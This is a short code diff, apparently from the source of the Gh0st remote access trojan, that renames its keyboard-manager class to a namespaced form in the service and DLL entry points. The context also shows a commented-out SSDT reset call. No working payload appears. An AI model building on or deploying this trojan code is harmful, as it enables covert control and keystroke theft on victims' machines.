@@ -63,7 +63,7 @@ UINT WINAPI ServerMain(char *lpServiceName)
 		SetProcessWindowStation(hWinSta);
 	}
 
-	if (CGh0stKeyboardManager::g_hInstance != NULL) {
+	if (Gh0st::CKeyboardManager::g_hInstance != NULL) {
 		// 让程序优雅崩溃
 		SetUnhandledExceptionFilter(ExceptionFilter);
 		//ResetSSDT();
@@ -198,7 +198,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
     case DLL_THREAD_ATTACH:
-		CGh0stKeyboardManager::g_hInstance = (HINSTANCE)hModule;
+		Gh0st::CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
